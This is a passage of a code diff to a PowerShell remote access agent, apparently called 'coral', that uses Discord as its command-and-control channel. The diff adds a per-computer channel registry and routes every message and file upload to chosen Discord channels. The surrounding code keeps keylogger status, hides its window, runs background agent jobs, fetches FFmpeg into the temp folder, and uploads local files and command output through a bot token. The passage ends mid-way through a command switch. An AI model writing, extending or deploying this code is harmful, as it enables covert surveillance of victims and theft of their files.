@@ -7,6 +7,10 @@ $global:keyloggerstatus = $false
 $global:lastMessageAttachments = $null
 $global:lastJobCheck = Get-Date
 $global:processes = @()
+
+# =============================== GLOBAL VAR - CHANNELS REGISTRY ==============================
+$global:ChannelRegistry = @{}
+$global:SessionID = $null  # Will be set to coral-control channel ID
 # =============================== GLOBAL VAR - THEME (WIP) ==============================
 # You can add more here but gotta install the files yourself ( URL not supported for now )
 # shld add download and stuff
@@ -37,10 +41,10 @@ $global:theme_enabled = $false
 #GETTHEME
 function GetCurrentTheme{
     if ($global:theme_enabled){
-        sendEmbedWithImage -Title "Current theme: $($global:currenttheme)" -Description "Color: $($global:themes[$global:currenttheme].color)`nImage Path: $($global:themes[$global:currenttheme].image)"
+        sendEmbedWithImage -Title "CURRENT THEME" -Description "Theme: $($global:currenttheme)`nColor: $($global:themes[$global:currenttheme].color)`nImage Path: $($global:themes[$global:currenttheme].image)"
     }
     else{
-        sendEmbedWithImage -Title "Themes are currently disabled" -Description "Use the command `ENABLETHEME` to enable themes"
+        sendEmbedWithImage -Title "THEMES DISABLED" -Description "Use the command `ENABLETHEME` to enable themes"
     }
 }
 #SETTHEME
@@ -48,28 +52,28 @@ function SetCurrentTheme{
     param([string]$themename)
     if ($global:themes.ContainsKey($themename)){
         $global:currenttheme = $themename
-        sendEmbedWithImage -Title "Theme changed to: $($global:currenttheme)" -Description "Color: $($global:themes[$global:currenttheme].color)`nImage Path: $($global:themes[$global:currenttheme].image)"
+        sendEmbedWithImage -Title "THEME CHANGED" -Description "Theme changed to: $($global:currenttheme)`nColor: $($global:themes[$global:currenttheme].color)`nImage Path: $($global:themes[$global:currenttheme].image)"
     }
     else{
         $availableThemes = $global:themes.Keys -join ", "
-        sendEmbedWithImage -Title ":x: **Theme not found**" -Description "Available themes are: $availableThemes"
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **Theme not found**`nAvailable themes are: $availableThemes" -Color "13369344"
     }
 }
 #ENABLETHEME
 function EnableTheme{
     $global:theme_enabled = $true
-    sendEmbedWithImage -Title "Themes have been enabled" -Description "Use the command `SETTHEME` to change the theme."
+    sendEmbedWithImage -Title "THEMES ENABLED" -Description "Use the command `SETTHEME` to change the theme."
 }
 #DISABLETHEME
 function DisableTheme{
     $global:theme_enabled = $false
-    sendEmbedWithImage -Title "Themes have been disabled" -Description "Use the command `ENABLETHEME` to enable themes."
+    sendEmbedWithImage -Title "THEMES DISABLED" -Description "Use the command `ENABLETHEME` to enable themes."
 }
 # =============================== GET FFMPEGs ====================================
 
 #ENABLEFFMPEG
 function GetFfmpeg{
-    sendEmbedWithImage -Title "Downloading FFmpeg" -Description "Please wait while FFmpeg is being downloaded..."  
+    sendEmbedWithImage -Title "DOWNLOADING FFMPEG" -Description "Please wait while FFmpeg is being downloaded..."  
     $Path = "$env:Temp\ffmpeg.exe"
     $tempDir = "$env:temp"
     If (!(Test-Path $Path)){  
@@ -88,16 +92,19 @@ function GetFfmpeg{
         rm -Path $zipFilePath -Force
         rm -Path $extractedDir -Recurse -Force
     }
-    sendEmbedWithImage -Title "FFmpeg Download Complete" -Description "FFmpeg has been successfully downloaded and is ready to use."
+    sendEmbedWithImage -Title "FFMPEG DOWNLOAD COMPLETE" -Description "FFmpeg has been successfully downloaded and is ready to use."
+
 }
 
 #DISABLEFFMPEG
 function RemoveFfmpeg{
+    sendEmbedWithImage -Title "REMOVING FFMPEG" -Description "Please wait while FFmpeg is being removed..."
     $Path = "$env:Temp\ffmpeg.exe"
     If (Test-Path $Path){  
         rm -Path $Path -Force
+        sendEmbedWithImage -Title "FFMPEG REMOVED" -Description "FFmpeg has been successfully removed."
     }
-    sendEmbedWithImage -Title "FFmpeg Removal Complete" -Description "FFmpeg has been successfully removed."
+    
 }
 
 # =============================== DISCORD API FUNCTIONS ===============================
@@ -116,11 +123,25 @@ function Invoke-DiscordAPI {
             Start-Sleep -Milliseconds ($DelayMs * $attempt)
             $wc = New-Object System.Net.WebClient
             foreach ($key in $Headers.Keys) { $wc.Headers.Add($key, $Headers[$key]) }
-            if ($Method -eq "POST" -and $Body) {
-                $wc.Headers.Add("Content-Type", "application/json")
-                return $wc.UploadString($Url, "POST", $Body)
-            } else {
-                return $wc.DownloadString($Url)
+            
+            switch ($Method.ToUpper()) {
+                "POST" {
+                    if ($Body) {
+                        $wc.Headers.Add("Content-Type", "application/json")
+                        return $wc.UploadString($Url, "POST", $Body)
+                    } else {
+                        return $wc.UploadString($Url, "POST", "")
+                    }
+                }
+                "DELETE" {
+                    return $wc.UploadString($Url, "DELETE", "")
+                }
+                "GET" {
+                    return $wc.DownloadString($Url)
+                }
+                default {
+                    return $wc.DownloadString($Url)
+                }
             }
         }
         catch {
@@ -171,16 +192,259 @@ Function NewChannelCategory {
 }
 
 Function NewChannel {
-    param([string]$name)
+    param(
+        [string]$name,
+        [string]$assignTo = $null  # Optional: assign to specific variable or just register
+    )
+    
+    if (-not $name) {
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **Channel name required**" -Color "13369344"
+        return $null
+    }
+    
+    # Check if channel already exists in our registry
+    if ($global:ChannelRegistry.ContainsKey($name)) {
+        sendEmbedWithImage -Title "Channel Exists" -Description ":information_source: **Channel already exists:** ``$name`` (ID: $($global:ChannelRegistry[$name]))"
+        return $global:ChannelRegistry[$name]
+    }
+    
+    # Check if channel exists on Discord
     $headers = @{ 'Authorization' = "Bot $token" }
     $response = Invoke-DiscordAPI -Url "https://discord.com/api/v10/users/@me/guilds" -Headers $headers
     $guilds = $response | ConvertFrom-Json
     $guildID = $guilds[0].id
-    $uri = "https://discord.com/api/guilds/$guildID/channels"
-    $body = @{ "name" = "$name"; "type" = 0; "parent_id" = $CategoryID } | ConvertTo-Json
-    $response = Invoke-DiscordAPI -Url $uri -Headers $headers -Method "POST" -Body $body
-    $responseObj = ConvertFrom-Json $response
-    $global:ChannelID = $responseObj.id
+    $channels = Invoke-DiscordAPI -Url "https://discord.com/api/v10/guilds/$guildID/channels" -Headers $headers
+    $channelList = $channels | ConvertFrom-Json
+    
+    # Look for existing channel with same name in our category
+    foreach ($channel in $channelList) {
+        if ($channel.type -eq 0 -and $channel.name -eq $name -and $channel.parent_id -eq $global:CategoryID) {
+            # Channel exists, add to registry
+            $global:ChannelRegistry[$name] = $channel.id
+            sendEmbedWithImage -Title "Channel Found" -Description ":white_check_mark: **Found existing channel:** ``$name`` (ID: $($channel.id))"
+            return $channel.id
+        }
+    }
+    
+    # Create new channel
+    try {
+        $uri = "https://discord.com/api/guilds/$guildID/channels"
+        $body = @{ 
+            "name" = "$name"
+            "type" = 0
+            "parent_id" = $global:CategoryID 
+        } | ConvertTo-Json
+        
+        $response = Invoke-DiscordAPI -Url $uri -Headers $headers -Method "POST" -Body $body
+        $responseObj = ConvertFrom-Json $response
+        $channelId = $responseObj.id
+        
+        # Add to registry
+        $global:ChannelRegistry[$name] = $channelId
+        
+        # Optionally assign to specific variable (for backwards compatibility)
+        if ($assignTo -eq "main" -or $assignTo -eq "coral-control") {
+            $global:ChannelID = $channelId
+            $global:SessionID = $channelId
+        }
+        
+        sendEmbedWithImage -Title "Channel Created" -Description ":white_check_mark: **Created channel:** ``$name`` (ID: $channelId)"
+        return $channelId
+        
+    } catch {
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **Failed to create channel:** ``$name`` - $($_.Exception.Message)" -Color "13369344"
+        return $null
+    }
+}
+
+
+
+Function Get_OrCreateChannel {
+    param([string]$channelName)
+    
+    if ($global:ChannelRegistry.ContainsKey($channelName)) {
+        return $global:ChannelRegistry[$channelName]
+    }
+    
+    return NewChannel -name $channelName
+}
+
+Function List_Channels {
+    param(
+        [switch]$ShowDetails,
+        [switch]$ForceRefresh  # New parameter to force complete refresh
+    )
+    
+    try {
+        $headers = @{ 'Authorization' = "Bot $token" }
+        $response = Invoke-DiscordAPI -Url "https://discord.com/api/v10/users/@me/guilds" -Headers $headers
+        $guilds = $response | ConvertFrom-Json
+        $guildID = $guilds[0].id
+        $channels = Invoke-DiscordAPI -Url "https://discord.com/api/v10/guilds/$guildID/channels" -Headers $headers
+        $channelList = $channels | ConvertFrom-Json
+        
+        # Track changes
+        $oldCount = $global:ChannelRegistry.Count
+        $newChannels = 0
+        $updatedChannels = 0
+        
+        # Clear registry if forcing refresh
+        if ($ForceRefresh) {
+            $global:ChannelRegistry.Clear()
+        }
+        
+        $foundChannels = @()
+        
+        # Find all text channels in our category
+        foreach ($channel in $channelList) {
+            if ($channel.type -eq 0 -and $channel.parent_id -eq $global:CategoryID) {
+                
+                # Check if this is a new channel or updated channel
+                $wasExisting = $global:ChannelRegistry.ContainsKey($channel.name)
+                $wasIdChanged = $wasExisting -and ($global:ChannelRegistry[$channel.name] -ne $channel.id)
+                
+                # Add/update in registry
+                $global:ChannelRegistry[$channel.name] = $channel.id
+                
+                # Track changes
+                if (-not $wasExisting) {
+                    $newChannels++
+                } elseif ($wasIdChanged) {
+                    $updatedChannels++
+                }
+                
+                $foundChannels += [PSCustomObject]@{
+                    Name = $channel.name
+                    Id = $channel.id
+                    Position = $channel.position
+                    Topic = $channel.topic
+                    IsNew = -not $wasExisting
+                    WasUpdated = $wasIdChanged
+                    CreatedAt = if ($channel.id) { 
+                        $timestamp = [math]::Floor(($channel.id -shr 22) + 1420070400000) / 1000
+                        [DateTime]::new(1970,1,1,0,0,0,[DateTimeKind]::Utc).AddSeconds($timestamp).ToString("yyyy-MM-dd HH:mm:ss UTC")
+                    } else { "Unknown" }
+                }
+            }
+        }
+        
+        # Build response message
+        $action = if ($ForceRefresh) { "Complete Refresh" } else { "Discovery & List" }
+        $msg = ":file_folder: **Channel Registry - $action**`n`n"
+        
+        if ($ForceRefresh) {
+            $msg += "**Previous count:** $oldCount`n"
+            $msg += "**Current count:** $($global:ChannelRegistry.Count)`n"
+            $msg += "**Registry completely rebuilt**`n"
+        } else {
+            $msg += "**Registry count:** $($global:ChannelRegistry.Count)`n"
+            if ($newChannels -gt 0) {
+                $msg += "**New channels discovered:** $newChannels`n"
+            }
+            if ($updatedChannels -gt 0) {
+                $msg += "**Updated channels:** $updatedChannels`n"
+            }
+        }
+        
+        $msg += "**Category:** $env:COMPUTERNAME (ID: $global:CategoryID)`n`n"
+        
+        if ($foundChannels.Count -gt 0) {
+            $msg += "**Channels:**`n"
+            
+            # Sort channels by position
+            $sortedChannels = $foundChannels | Sort-Object Position
+            
+            foreach ($channel in $sortedChannels) {
+                $isMain = if ($channel.Id -eq $global:SessionID) { " :star:" } else { "" }
+                $status = ""
+                if (-not $ForceRefresh) {
+                    if ($channel.IsNew) { $status = " :new:" }
+                    elseif ($channel.WasUpdated) { $status = " :repeat:" }
+                }
+                
+                if ($ShowDetails) {
+                    $msg += "**$($channel.Name)**$isMain$status`n"
+                    $msg += "  ID: ``$($channel.Id)```n"
+                    $msg += "  Position: $($channel.Position)`n"
+                    $msg += "  Created: $($channel.CreatedAt)`n"
+                    if ($channel.Topic) {
+                        $topic = if ($channel.Topic.Length -gt 50) { $channel.Topic.Substring(0, 50) + "..." } else { $channel.Topic }
+                        $msg += "  Topic: $topic`n"
+                    } else {
+                        $msg += "  Topic: None`n"
+                    }
+                    $msg += "`n"
+                } else {
+                    $msg += "**$($channel.Name)** - ``$($channel.Id)``$isMain$status`n"
+                }
+            }
+        } else {
+            $msg += ":warning: **No channels found in category**"
+        }
+        
+        sendEmbedWithImage -Title "Channel Registry" -Description $msg
+        
+    } catch {
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **Error accessing channel registry:** $($_.Exception.Message)" -Color "13369344"
+    }
+}
+
+Function Remove_ChannelFromRegistry {
+    param([string]$channelName, [switch]$DeleteFromDiscord = $true)
+    
+    if (-not $global:ChannelRegistry.ContainsKey($channelName)) {
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **Channel not in registry:** ``$channelName``" -Color "13369344"
+        return
+    }
+    
+    $channelId = $global:ChannelRegistry[$channelName]
+    
+    # Check if this is the main channel - prevent deletion
+    if ($channelId -eq $global:SessionID) {
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **Cannot delete main channel:** ``$channelName``" -Color "13369344"
+        return
+    }
+    
+    if ($DeleteFromDiscord) {
+        try {
+            # Delete the channel from Discord
+            $headers = @{ 'Authorization' = "Bot $token" }
+            $deleteUrl = "https://discord.com/api/v10/channels/$channelId"
+            
+            $response = Invoke-DiscordAPI -Url $deleteUrl -Headers $headers -Method "DELETE"
+            
+            # Remove from local registry after successful deletion
+            $global:ChannelRegistry.Remove($channelName)
+            
+            sendEmbedWithImage -Title "CHANNEL DELETED" -Description ":wastebasket: **Channel deleted successfully:** ``$channelName`` (ID: $channelId)"
+            
+        } catch {
+            $errorMsg = $_.Exception.Message
+            if ($errorMsg -match "403") {
+                sendEmbedWithImage -Title "PERMISSION ERROR" -Description ":x: **Cannot delete channel:** ``$channelName`` - Bot lacks permission to delete channels" -Color "13369344"
+            } elseif ($errorMsg -match "404") {
+                # Channel doesn't exist on Discord, remove from registry anyway
+                $global:ChannelRegistry.Remove($channelName)
+                sendEmbedWithImage -Title "ERROR" -Description ":information_source: **Channel not found on Discord, removed from registry:** ``$channelName``" -Color "13369344"
+            } else {
+                sendEmbedWithImage -Title "ERROR" -Description ":x: **Error deleting channel:** ``$channelName`` - $errorMsg" -Color "13369344"
+            }
+        }
+    } else {
+        # Just remove from registry without deleting from Discord
+        $global:ChannelRegistry.Remove($channelName)
+        sendEmbedWithImage -Title "CHANNEL REMOVED FROM REGISTRY" -Description ":wastebasket: **Removed from registry only:** ``$channelName`` (ID: $channelId)"
+    }
+}
+Function Set_MainChannel {
+    param([string]$channelName)
+    
+    if ($global:ChannelRegistry.ContainsKey($channelName)) {
+        $global:SessionID = $global:ChannelRegistry[$channelName]
+        sendEmbedWithImage -Title "MAIN CHANNEL CHANGED" -Description ":star: **Main channel set to:** ``$channelName`` (ID: $($global:SessionID))"
+    } else {
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **Channel not in registry:** ``$channelName``" -Color "13369344"
+    }
 }
 
 Function PullMsg {
@@ -200,11 +464,39 @@ Function PullMsg {
 
 # =============================== MESSAGE FUNCTIONS ===============================
 function sendMsg {
-    param([string]$Message, [hashtable]$Embed, [string]$ImagePath)
-    $url = "https://discord.com/api/v10/channels/$SessionID/messages"
+    param(
+        [string]$Message, 
+        [hashtable]$Embed, 
+        [string]$ImagePath,
+        [string]$ChannelTarget = $null  # Can be channel name or ID
+    )
     
+    # Determine target channel
+    $targetChannelId = $global:SessionID  # Default to main channel
+    
+    if ($ChannelTarget) {
+        # Check if it's a channel name in registry
+        if ($global:ChannelRegistry.ContainsKey($ChannelTarget)) {
+            $targetChannelId = $global:ChannelRegistry[$ChannelTarget]
+        }
+        # Check if it's a valid channel ID (20+ digit string)
+        elseif ($ChannelTarget -match '^\d{18,20}$') {
+            $targetChannelId = $ChannelTarget
+        }
+        # Try to create/find the channel
+        else {
+            $targetChannelId = Get_OrCreateChannel -channelName $ChannelTarget
+            if (-not $targetChannelId) {
+                $targetChannelId = $global:SessionID  # Fallback to main
+            }
+        }
+    }
+    
+    $url = "https://discord.com/api/v10/channels/$targetChannelId/messages"
+    
+    # Rest of function remains the same, just use $targetChannelId
     if ($ImagePath -and (Test-Path $ImagePath)) {
-        sendMsgWithImage -Message $Message -Embed $Embed -ImagePath $ImagePath
+        sendMsgWithImage -Message $Message -Embed $Embed -ImagePath $ImagePath -ChannelTarget $targetChannelId
         return
     }
     
@@ -217,21 +509,35 @@ function sendMsg {
     }
     
     if ($Message) {
-        if ($Message.Length -gt 15000) { Send_AsFile -Content $Message }
-        elseif ($Message.Length -gt 1950) { Send_ChunkedMessage -Content $Message }
-        else { Send_SingleMessage -Content $Message }
+        if ($Message.Length -gt 15000) { Send_AsFile -Content $Message -ChannelTarget $targetChannelId }
+        elseif ($Message.Length -gt 1950) { Send_ChunkedMessage -Content $Message -ChannelTarget $targetChannelId }
+        else { Send_SingleMessage -Content $Message -ChannelTarget $targetChannelId }
     }
 }
 
 function sendMsgWithImage {
-    param([string]$Message, [hashtable]$Embed, [string]$ImagePath)
+    param([string]$Message, [hashtable]$Embed, [string]$ImagePath, [string]$ChannelTarget = $null)
     
     if (-not (Test-Path $ImagePath)) {
-        sendMsg -Message ":x: **Image file not found:** ``$ImagePath``"
+        sendMsg -Message ":x: **Image file not found:** ``$ImagePath``" -ChannelTarget $ChannelTarget
         return
     }
     
-    $url = "https://discord.com/api/v10/channels/$SessionID/messages"
+    # Determine target channel
+    $targetChannelId = $global:SessionID
+    
+    if ($ChannelTarget) {
+        if ($global:ChannelRegistry.ContainsKey($ChannelTarget)) {
+            $targetChannelId = $global:ChannelRegistry[$ChannelTarget]
+        } elseif ($ChannelTarget -match '^\d{18,20}$') {
+            $targetChannelId = $ChannelTarget
+        } else {
+            $targetChannelId = Get_OrCreateChannel -channelName $ChannelTarget
+            if (-not $targetChannelId) { $targetChannelId = $global:SessionID }
+        }
+    }
+    
+    $url = "https://discord.com/api/v10/channels/$targetChannelId/messages"
     
     try {
         # Create multipart form data
@@ -295,45 +601,61 @@ function sendMsgWithImage {
         try {
             if ($Message -or ($Embed -and $Embed.title)) {
                 $fallbackMsg = if ($Message) { $Message } else { $Embed.title }
-                sendMsg -Message $fallbackMsg
+                sendMsg -Message $fallbackMsg -ChannelTarget $ChannelTarget
             }
-            sendFile -sendfilePath $ImagePath
+            sendFile -sendfilePath $ImagePath -ChannelTarget $ChannelTarget
         } catch {
-            sendMsg -Message ":x: **Error sending image:** $($_.Exception.Message)"
+            sendMsg -Message ":x: **Error sending image:** $($_.Exception.Message)" -ChannelTarget $ChannelTarget
         }
     }
 }
 
 function sendEmbedWithImage {
-    param([string]$Title, [string]$Description, [string]$ImagePath = $null, [int]$Color = $null)
+    param(
+        [string]$Title, 
+        [string]$Description, 
+        [string]$ImagePath = $null, 
+        [int]$Color = $null,
+        [string]$ChannelTarget = $null
+    )
+    
+    # Use provided channel or fallback to session channel
+    $targetChannelId = $global:SessionID
+    
+    if ($ChannelTarget) {
+        if ($global:ChannelRegistry.ContainsKey($ChannelTarget)) {
+            $targetChannelId = $global:ChannelRegistry[$ChannelTarget]
+        } elseif ($ChannelTarget -match '^\d{18,20}$') {
+            $targetChannelId = $ChannelTarget
+        } else {
+            $targetChannelId = Get_OrCreateChannel -channelName $ChannelTarget
+            if (-not $targetChannelId) { $targetChannelId = $global:SessionID }
+        }
+    }
     
     # Get theme color - always use theme color unless explicitly overridden
-    $Color = $global:themes[$global:currenttheme].color
-    
+    if ($null -eq $Color -or $Color -eq 0) {
+        $Color = $global:themes[$global:currenttheme].color
+    }
     
     # Determine image path logic
     $finalImagePath = $null
     
     if ([string]::IsNullOrEmpty($ImagePath)) {
-        # No image path provided - use theme image if themes are enabled
         if ($global:theme_enabled -eq $true) {
             $themeImagePath = $global:themes[$global:currenttheme].image
             if ($themeImagePath -and (Test-Path $themeImagePath)) {
                 $finalImagePath = $themeImagePath
             }
         }
-        # If themes disabled or no theme image, $finalImagePath stays null
     } else {
-        # Image path provided - use it if it exists
         if (Test-Path $ImagePath) {
             $finalImagePath = $ImagePath
         }
-        # If provided path doesn't exist, $finalImagePath stays null
     }
     
     # Send embed with or without image based on final determination
     if ($finalImagePath) {
-        # Send embed with image
         $embed = @{
             title = $Title
             description = $Description
@@ -342,9 +664,8 @@ function sendEmbedWithImage {
                 url = "attachment://$(Split-Path $finalImagePath -Leaf)"
             }
         }
-        sendMsgWithImage -Embed $embed -ImagePath $finalImagePath
+        sendMsgWithImage -Embed $embed -ImagePath $finalImagePath -ChannelTarget $targetChannelId
     } else {
-        # Send embed without image
         $embed = @{
             embeds = @(
                 @{
@@ -354,13 +675,28 @@ function sendEmbedWithImage {
                 }
             )
         }
-        sendMsg -Embed $embed
+        sendMsg -Embed $embed -ChannelTarget $targetChannelId
     }
 }
 
 function Send_SingleMessage {
-    param([string]$Content)
-    $url = "https://discord.com/api/v10/channels/$SessionID/messages"
+    param([string]$Content, [string]$ChannelTarget = $null)
+    
+    # Determine target channel
+    $targetChannelId = $global:SessionID
+    
+    if ($ChannelTarget) {
+        if ($global:ChannelRegistry.ContainsKey($ChannelTarget)) {
+            $targetChannelId = $global:ChannelRegistry[$ChannelTarget]
+        } elseif ($ChannelTarget -match '^\d{18,20}$') {
+            $targetChannelId = $ChannelTarget
+        } else {
+            $targetChannelId = Get_OrCreateChannel -channelName $ChannelTarget
+            if (-not $targetChannelId) { $targetChannelId = $global:SessionID }
+        }
+    }
+    
+    $url = "https://discord.com/api/v10/channels/$targetChannelId/messages"
     $headers = @{ 'Authorization' = "Bot $token" }
     $cleanMessage = Clean_MessageContent -InputMessage $Content
     
@@ -385,25 +721,27 @@ function Send_SingleMessage {
 }
 
 function Send_ChunkedMessage {
-    param([string]$Content)
+    param([string]$Content, [string]$ChannelTarget = $null)
+    
     $chunks = Split_IntoChunks -Text $Content -ChunkSize 1800
     $totalChunks = $chunks.Count
     
-    if ($totalChunks -gt 8) { Send_AsFile -Content $Content; return }
+    if ($totalChunks -gt 8) { Send_AsFile -Content $Content -ChannelTarget $ChannelTarget; return }
     
-    Send_SingleMessage -Content ":page_facing_up: **Large output detected - sending in $totalChunks parts:**"
+    Send_SingleMessage -Content ":page_facing_up: **Large output detected - sending in $totalChunks parts:**" -ChannelTarget $ChannelTarget
     
     for ($i = 0; $i -lt $chunks.Count; $i++) {
         $partNumber = $i + 1
         $chunkContent = "**Part $partNumber/$totalChunks :**`n``````$($chunks[$i])``````"
-        Send_SingleMessage -Content $chunkContent
+        Send_SingleMessage -Content $chunkContent -ChannelTarget $ChannelTarget
         Start-Sleep -Milliseconds 750
     }
-    Send_SingleMessage -Content ":white_check_mark: **Output complete ($totalChunks parts sent)**"
+    Send_SingleMessage -Content ":white_check_mark: **Output complete ($totalChunks parts sent)**" -ChannelTarget $ChannelTarget
 }
 
 function Send_AsFile {
-    param([string]$Content)
+    param([string]$Content, [string]$ChannelTarget = $null)
+    
     try {
         $tempDir = $env:TEMP
         $fileName = "coral_output_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
@@ -411,18 +749,17 @@ function Send_AsFile {
         $Content | Out-File -FilePath $tempFile -Encoding UTF8
         
         if (Test-Path $tempFile) {
-            sendFile -sendfilePath $tempFile
+            sendFile -sendfilePath $tempFile -ChannelTarget $ChannelTarget
             $fileSize = [math]::Round((Get-Item $tempFile).Length / 1KB, 2)
-            Send_SingleMessage -Content ":page_facing_up: **Large output sent as file** (Size: $fileSize KB, Length: $($Content.Length) characters)"
+            Send_SingleMessage -Content ":page_facing_up: **Large output sent as file** (Size: $fileSize KB, Length: $($Content.Length) characters)" -ChannelTarget $ChannelTarget
             Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
         } else {
-            Send_SingleMessage -Content ":warning: **Failed to create temp file - sending truncated output:**"
+            Send_SingleMessage -Content ":warning: **Failed to create temp file - sending truncated output:**" -ChannelTarget $ChannelTarget
             $truncated = $Content.Substring(0, 1800) + "`n`n... (output too large, file creation failed)"
-            Send_SingleMessage -Content "``````$truncated``````"
+            Send_SingleMessage -Content "``````$truncated``````" -ChannelTarget $ChannelTarget
         }
-    } catch { Send_ChunkedMessage -Content $Content }
+    } catch { Send_ChunkedMessage -Content $Content -ChannelTarget $ChannelTarget }
 }
-
 function Split_IntoChunks {
     param([string]$Text, [int]$ChunkSize = 1800)
     $chunks = @()
@@ -471,9 +808,24 @@ function Clean_MessageContent {
 
 #SENDFILE
 function sendFile {
-    param([string]$sendfilePath)
+    param([string]$sendfilePath, [string]$ChannelTarget = $null)
+    
+    # Determine target channel
+    $targetChannelId = $global:SessionID
+    
+    if ($ChannelTarget) {
+        if ($global:ChannelRegistry.ContainsKey($ChannelTarget)) {
+            $targetChannelId = $global:ChannelRegistry[$ChannelTarget]
+        } elseif ($ChannelTarget -match '^\d{18,20}$') {
+            $targetChannelId = $ChannelTarget
+        } else {
+            $targetChannelId = Get_OrCreateChannel -channelName $ChannelTarget
+            if (-not $targetChannelId) { $targetChannelId = $global:SessionID }
+        }
+    }
+    
     if (-not $sendfilePath -or -not (Test-Path $sendfilePath -PathType Leaf)) {
-        sendEmbedWithImage -Title "ERROR" -Description ":x: **File not found:** ``$sendfilePath``"
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **File not found:** ``$sendfilePath``" -Color "13369344" -ChannelTarget $targetChannelId 
         return
     }
 
@@ -483,17 +835,17 @@ function sendFile {
     $fileSizeMB = [math]::Round($fileSize / 1MB, 2)
     
     if ($fileSize -gt 10MB) {
-        sendEmbedWithImage -Title "ERROR" -Description ":x: **File too large:** ``$fileName`` (${fileSizeMB}MB). Maximum allowed is 10MB."
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **File too large:** ``$fileName`` (${fileSizeMB}MB). Maximum allowed is 10MB."  -Color "13369344" -ChannelTarget $targetChannelId
         return
     }
 
-    $url = "https://discord.com/api/v10/channels/$SessionID/messages"
+    $url = "https://discord.com/api/v10/channels/$targetChannelId/messages"
     $webClient = New-Object System.Net.WebClient
     $webClient.Headers.Add("Authorization", "Bot $token")
     if (Test-Path $sendfilePath -PathType Leaf) {
         $response = $webClient.UploadFile($url, "POST", $sendfilePath)
     } else {
-        sendEmbedWithImage -Title "ERROR" -Description ":x: **File not found:** ``$sendfilePath``"
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **File not found:** ``$sendfilePath``"  -Color "13369344" -ChannelTarget $targetChannelId
     }
 }
 #DOWNLOADFILE
@@ -501,7 +853,7 @@ function downloadFile {
     param([string]$attachmentUrl, [string]$fileName, [string]$downloadPath = $env:TEMP)
     
     if (-not $attachmentUrl -or -not $fileName) {
-        sendEmbedWithImage -Title "ERROR" -Description ":x: **Error:** Missing attachment URL or filename"
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **Error:** Missing attachment URL or filename"  -Color "13369344"
         return
     }
     
@@ -525,14 +877,13 @@ function downloadFile {
             sendEmbedWithImage -Title "File Download Complete" -Description "Path: `$fullPath`nSize: ${fileSize} KB"
             return
         } else {
-            sendEmbedWithImage -Title "ERROR" -Description ":x: **Download failed:** File was not created"
+            sendEmbedWithImage -Title "ERROR" -Description ":x: **Download failed:** File was not created"  -Color "13369344"
         }
     } catch {
-        sendEmbedWithImage -Title "ERROR" -Description ":x: **Download error:** $($_.Exception.Message)"
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **Download error:** $($_.Exception.Message)"  -Color "13369344"
     }
 }
-# =============================== quick info ===================
-#QUICKINFO
+
 # =============================== WINDOW FUNCTIONS ===============================
 function HideWindow {
     $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
@@ -554,7 +905,7 @@ function Start_AgentJob {
     $RandName = -join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 6)
     
     $job = Start-Job -ScriptBlock {
-        param($ScriptString, $token, $SessionID, $CategoryID, $ModuleRegistry, $themes, $currenttheme, $theme_enabled)
+        param($ScriptString, $token, $SessionID, $CategoryID, $ModuleRegistry, $themes, $currenttheme, $theme_enabled, $ChannelRegistry)
         
         # Set global variables in job scope
         $global:token = $token
@@ -564,6 +915,7 @@ function Start_AgentJob {
         $global:themes = $themes
         $global:currenttheme = $currenttheme
         $global:theme_enabled = $theme_enabled
+        $global:ChannelRegistry = $ChannelRegistry  # NEW: Add channel registry
         $global:hidewindow = $true
         $global:keyloggerstatus = $false
         $global:lastMessageAttachments = $null
@@ -590,11 +942,12 @@ function Start_AgentJob {
         ${function:EnableTheme} = ${using:function:EnableTheme}
         ${function:DisableTheme} = ${using:function:DisableTheme}
         
-        # REMOVE THESE LINES - No longer importing local keylogger functions
-        # ${function:keylogger} = ${using:function:keylogger}
-        # ${function:Start_Keylogger} = ${using:function:Start_Keylogger}
-        # ${function:Stop_Keylogger} = ${using:function:Stop_Keylogger}
-        # ${function:Get_KeyloggerStatus} = ${using:function:Get_KeyloggerStatus}
+        # Import CRITICAL channel management functions - NEW
+        ${function:NewChannel} = ${using:function:NewChannel}
+        ${function:Get_OrCreateChannel} = ${using:function:Get_OrCreateChannel}
+        ${function:List_Channels} = ${using:function:List_Channels}
+        ${function:Remove_ChannelFromRegistry} = ${using:function:Remove_ChannelFromRegistry}
+        ${function:Set_MainChannel} = ${using:function:Set_MainChannel}
         
         # Import CRITICAL dynamic loading functions - MUST HAVE
         ${function:Find_CommandInRegistry} = ${using:function:Find_CommandInRegistry}
@@ -620,10 +973,54 @@ function Start_AgentJob {
                 'GETTHEME' { GetCurrentTheme }
                 'ENABLETHEME' { EnableTheme }
                 'DISABLETHEME' { DisableTheme }
-                # REMOVE THESE KEYLOGGER CASES - No longer handling locally
-                # 'STARTKEYLOG' { ... }
-                # 'STOPKEYLOG' { Stop_Keylogger }
-                # 'KEYLOGSTATUS' { Get_KeyloggerStatus }
+                
+                # NEW: Channel management commands in jobs
+                'CREATECHANNEL' {
+                    if ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name")) {
+                        $channelName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
+                        NewChannel -name $channelName
+                    } else {
+                        sendEmbedWithImage -Title "ERROR" -Description ":x: **Usage:** ``CREATECHANNEL <channel-name>``" -Color "13369344"
+                    }
+                }
+                'LISTCHANNELS' {
+                    $showDetails = $parameters.ContainsKey("details") -or $parameters.ContainsKey("d")
+                    $forceRefresh = $parameters.ContainsKey("refresh") -or $parameters.ContainsKey("r")
+                    List_Channels -ShowDetails:$showDetails -ForceRefresh:$forceRefresh
+                }
+                'SETCHANNEL' {
+                    if ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name")) {
